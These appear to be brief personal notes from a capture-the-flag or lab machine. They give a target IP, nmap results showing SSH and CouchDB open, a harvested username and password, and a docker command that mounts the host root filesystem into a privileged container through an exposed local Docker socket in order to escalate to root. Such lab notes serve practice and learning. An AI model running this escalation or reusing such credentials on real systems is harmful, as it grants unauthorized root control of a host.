ip address:10.10.218.81



nmap resulttts:
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5984/tcp open  couchdb syn-ack


possible  user and passwd: atena:t4qfzcc4qN## 


docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
